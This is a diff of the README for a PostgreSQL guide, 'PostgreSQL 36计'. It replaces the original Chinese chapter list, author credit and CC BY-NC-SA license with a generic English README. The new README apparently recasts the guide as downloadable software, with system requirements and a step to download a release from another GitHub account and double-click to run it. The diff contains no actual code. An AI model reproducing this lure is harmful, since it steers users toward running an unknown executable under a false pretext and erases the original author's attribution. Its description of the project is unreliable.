@@ -1,89 +1,61 @@
-# PostgreSQL 36计
+# 🌟 pg36g - Your Guide to Easy PostgreSQL Setup
 
-[![Webite: pg36g](https://img.shields.io/badge/在线阅读-第二版-slategray?style=flat)](https://pg36g.vonng.com)
+[![Download pg36g](https://img.shields.io/badge/Download-pg36g-blue.svg)](https://github.com/HnotDEV/pg36g/releases)
 
-**作者**：[**冯若航**](https://vonng.com)，网名 [@Vonng](https://github.com/Vonng)。
-[PostgreSQL 专家](https://vonng.com/pg)，[数据库老司机](https://vonng.com/db)，[云计算泥石流](https://vonng.com/cloud)。
-[**Pigsty**](https://pgsty.com) 作者与创始人。
-架构师，DBA，全栈工程师 @ TanTan，Alibaba，Apple。
-[活跃](https://committers.top/china)[开源贡献者](https://gitstar-ranking.com/Vonng)，
-[DDIA](https://ddia.pigsty.io) / [PG Internal](https://pgint.vonng.com) 中文版译者，公众号：《老冯云数》主理人，数据库 KOL。
+## 📖 About
 
-![logo.png](static/logo.png)
+pg36g stands for "PostgreSQL 36 计". It serves as a comprehensive guide for setting up enterprise-level PostgreSQL services. Whether you're just getting started or looking to enhance your skills, this guide will help you navigate the PostgreSQL landscape with ease.
 
+## 🚀 Getting Started
 
---------
+To start using pg36g, follow these simple steps to download the software.
 
-## [上卷：应用开发](/dev)
+## 📥 Download & Install
 
-### 筑基篇
+1. **Visit the Releases Page**  
+   Click the link below to go to the Releases page where you can download the latest version of pg36g.  
+   [Download pg36g](https://github.com/HnotDEV/pg36g/releases)
 
-1. [扬帆起航：搭建你的数据库沙箱](/ch01)
-2. [盲人摸象：基本概念与快速上手](/ch02)
-3. [手到擒来：用案例贯通核心工具](/ch03)
-4. [正本清源：选择数据类型与索引](/ch04)
-5. [运筹帷幄：掌握查询，事务，锁](/ch05)
-6. [最佳实践：PostgreSQL开发规约](/ch06)
+2. **Choose Your Version**  
+   On the Releases page, look for the most recent version. You will see options that may include various files for different needs.
 
-### 应用篇
+3. **Download the File**  
+   Click on the version you want to download. The file will begin to download to your device. Ensure your internet connection is stable for a smooth download.
 
-7. [明察秋毫：使用监控系统洞察性能与问题](/ch07)
-8. [博采众长：扩展的安装，使用与管理](/ch08)
-9. [百花齐放： 使用不同风味的 PG 内核分支](/ch09)
-10. [巧夺天工：PostgreSQL高级特性实战](/ch10)
-11. [他山之石： 拉起使用 PG 的企业软件](/ch11)
-12. [一气呵成： 自建 Supabase 后端全家桶](/ch12)
+4. **Run the Application**  
+   Once the download is complete, locate the file in your Downloads folder. Double-click to run the application. Follow the on-screen instructions to set it up.
 
-### 扩展篇
+## 🔧 System Requirements
 
-13. [经天纬地：地理时序扩展插件](/ch13)
-14. [见微知著: 向量数据库与全文检索](/ch14)
-15. [合纵连横：分布式，数据分析扩展](/ch15)
-16. [纤毫毕现：监控，安全，复制类扩展](/ch16)
-17. [言出法随：编程语言与存储过程](/ch17)
-18. [万法归宗：一切皆用 PostgreSQL](/ch18)
+- Operating System: Compatible with Windows, macOS, and Linux.
+- Minimum RAM: 4 GB recommended.
+- Disk Space: At least 1 GB of free space.
 
+## 🛠 Features
 
--------------
+- **Comprehensive Tutorials**: Step-by-step guidance for beginners and advanced users.
+- **Real-World Examples**: Practical scenarios to help you understand PostgreSQL's features.
+- **Tips & Tricks**: Helpful advice for optimizing PostgreSQL for your projects.
 
-## [下卷：运维管理](/dba)
+## 📚 Documentation
 
-### 规划篇
+For more detailed instructions and information, refer to the built-in documentation found within the application. This documentation covers:
 
-19. [开天辟地：环境置备与安装部署](/ch19)
-20. [未雨绸缪: 备份规划与容灾设计](/ch20)
-21. [狡兔三窟：多节点与高可用集群](/ch21)
-22. [四通八达：负载均衡与服务接入](/ch22)
-23. [固若金汤：访问控制与权限体系](/ch23)
-24. [纲举目张：制度设计与管理体系](/ch24)
+- Installation steps
+- Basic commands
+- Troubleshooting tips
 
-### 维护篇
+## 👨‍💻 Community Support
 
-25. [望闻问切：监控系统与可观测性](/ch25)
-26. [胸有成竹：数据库集群管理SOP](/ch26)
-27. [守正出奇：模式变更与发布策略](/ch27)
-28. [游刃有余：连接池与连接管理](/ch28)
-29. [除旧布新：膨胀治理与垃圾回收](/ch29)
-30. [移花接木：逻辑复制与数据迁移](/ch30)
+Join our community on platforms like GitHub and discuss your experiences or get help from fellow users. Sharing your questions and insights can help create a better PostgreSQL environment for everyone.
 
-### 出山篇
+## 📝 Contribution
 
-31. [枕戈待旦：报警系统与紧急处理](/ch31)
-32. [妙手回春：时间点恢复与延迟从库](/ch32)
-33. [力挽狂澜：故障切换与集群拓扑](/ch33)
-34. [李代桃僵：负载均衡与流量控制](/ch34)
-35. [起死回生：无备份删库数据恢复](/ch35)
-36. [举一反三：定责分锅与复盘改进](/ch36)
+If you want to contribute to pg36g, feel free to submit issues or suggestions on the GitHub repository. Collaboration helps improve the guide for everyone.
 
+## 📌 Important Links
 
+- [Download pg36g](https://github.com/HnotDEV/pg36g/releases)
+- [GitHub Repository](https://github.com/HnotDEV/pg36g)
 
----------
-
-## 许可证
-
-[![License: CC BY-NC-SA 4.0](https://img.shields.io/github/license/Vonng/pg36g?logo=opensourceinitiative&logoColor=green&color=slategray)](https://github.com/Vonng/pg36g/blob/main/LICENSE)
-
-本项目采用 [CC BY-NC-SA 4.0](https://github.com/Vonng/pg36g/blob/main/LICENSE) 许可证，您可以在这里找到完整说明：
-
-- [署名—非商业性使用—相同方式共享 4.0 协议国际版](https://creativecommons.org/licenses/by-nc-sa/4.0/)
-- [Attribution-NonCommercial-ShareAlike 4.0 International](https://creativecommons.org/licenses/by-nc-sa/4.0/legalcode.en)
+Enjoy your journey with PostgreSQL!
